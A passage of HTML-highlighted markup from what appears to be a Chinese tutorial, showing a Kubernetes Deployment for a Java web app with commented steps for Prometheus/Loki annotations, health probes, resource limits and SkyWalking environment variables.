class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003ejava-web\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003ereplicas\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"m\"\u003e2\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003estrategy\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003etype\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eRollingUpdate\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003etemplate\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003emetadata\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003ejava-web\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003eannotations\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e   \u003c/span\u003e\u003cspan class=\"c\"\u003e# 第一点：新增注解\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"nt\"\u003eloki.io/scrape\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;true\u0026#39;\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e# 抓取直接输出的日志到loki里\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"nt\"\u003eprometheus.io/path\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003e/metrics\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#采集的监控地址\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"nt\"\u003eprometheus.io/port\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;2112\u0026#39;\u003c/span\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"c\"\u003e#采集暴露的监控端口\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"nt\"\u003eprometheus.io/scrape\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;true\u0026#39;\u003c/span\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"c\"\u003e#打开采集开关\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003elabels\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"nt\"\u003eapp\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003ejava-web\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003espec\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003eimagePullSecrets\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"c\"\u003e# 第二点：添加权限\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e- \u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003emy-docker\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#只有该用户才有pull镜像的权限\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003econtainers\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e- \u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003ejava-web\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e          \u003c/span\u003e\u003cspan class=\"nt\"\u003eimage\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003ehb.ops.top/ops/java-web:5917f92c\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e          \u003c/span\u003e\u003cspan class=\"nt\"\u003eimagePullPolicy\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eIfNotPresent\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e          \u003c/span\u003e\u003cspan class=\"nt\"\u003ereadinessProbe\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"c\"\u003e# 第三点：新增存活检测，当前是针对监控端口进行存活检测，也就是说只有当监控端口起来了，程序才算完全启动\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e\u003cspan class=\"nt\"\u003ehttpGet\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e              \u003c/span\u003e\u003cspan class=\"nt\"\u003eport\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"m\"\u003e2112\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e              \u003c/span\u003e\u003cspan class=\"nt\"\u003epath\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003e/metrics/prometheus\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e\u003cspan class=\"nt\"\u003einitialDelaySeconds\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"m\"\u003e60\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e\u003cspan class=\"nt\"\u003esuccessThreshold\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e\u003cspan class=\"nt\"\u003efailureThreshold\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"m\"\u003e3\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e\u003cspan class=\"nt\"\u003etimeoutSeconds\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"m\"\u003e5\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e          \u003c/span\u003e\u003cspan class=\"nt\"\u003estartupProbe\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e\u003cspan class=\"nt\"\u003ehttpGet\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e              \u003c/span\u003e\u003cspan class=\"nt\"\u003eport\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"m\"\u003e2112\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e              \u003c/span\u003e\u003cspan class=\"nt\"\u003epath\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003e/metrics/prometheus\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e\u003cspan class=\"nt\"\u003einitialDelaySeconds\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"m\"\u003e60\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e\u003cspan class=\"nt\"\u003esuccessThreshold\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e\u003cspan class=\"nt\"\u003efailureThreshold\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"m\"\u003e3\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e\u003cspan class=\"nt\"\u003etimeoutSeconds\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"m\"\u003e5\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e          \u003c/span\u003e\u003cspan class=\"nt\"\u003elivenessProbe\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e\u003cspan class=\"nt\"\u003ehttpGet\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e              \u003c/span\u003e\u003cspan class=\"nt\"\u003eport\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"m\"\u003e2112\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e              \u003c/span\u003e\u003cspan class=\"nt\"\u003epath\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003e/metrics/prometheus\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e\u003cspan class=\"nt\"\u003einitialDelaySeconds\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"m\"\u003e60\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e\u003cspan class=\"nt\"\u003esuccessThreshold\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e\u003cspan class=\"nt\"\u003efailureThreshold\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"m\"\u003e3\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e\u003cspan class=\"nt\"\u003etimeoutSeconds\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"m\"\u003e5\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e          \u003c/span\u003e\u003cspan class=\"nt\"\u003eresources\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e# 第四点：设置资源限制，如果是java程序，建议limit比request大，这样可以合理分配堆内存和非堆内存\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e\u003cspan class=\"nt\"\u003erequests\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e              \u003c/span\u003e\u003cspan class=\"nt\"\u003ememory\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003e1024Mi\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e\u003cspan class=\"nt\"\u003elimits\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e              \u003c/span\u003e\u003cspan class=\"nt\"\u003ememory\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003e2048Mi\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e          \u003c/span\u003e\u003cspan class=\"nt\"\u003eports\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e- \u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eweb-port\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e              \u003c/span\u003e\u003cspan class=\"nt\"\u003econtainerPort\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"m\"\u003e8889\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e          \u003c/span\u003e\u003cspan class=\"nt\"\u003eenv\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e# 第五点：设置环境变量，可以设置时区，指定EVN环境，添加JAVA参数等\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e- \u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eJVM_OPTS\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e              \u003c/span\u003e\u003cspan class=\"nt\"\u003evalue\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e-\u003cspan class=\"l\"\u003ejavaagent:/opt/skywalking/skywalking-agent.jar -Xmx1G -Xms1G\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e- \u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eTZ\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e              \u003c/span\u003e\u003cspan class=\"nt\"\u003evalue\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eAsia/Shanghai\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e- \u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eAPOLLO_LABEL\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e              \u003c/span\u003e\u003cspan class=\"nt\"\u003evalue\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003egray\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e- \u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eSW_AGENT_NAME\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e              \u003c/span\u003e\u003cspan class=\"nt\"\u003evalue\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;k8s-java-web\u0026#39;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e- \u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eSW_AGENT_COLLECTOR_BACKEND_SERVICES\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e              \u003c/span\u003e\u003cspan class=\"nt\"\u003evalue\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;10.0.0.123:11800\u0026#39;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e- \u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eENV\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e              \u003c/span\u003e\u003cspan class=\"nt\"\u003evalue\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eprod\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan 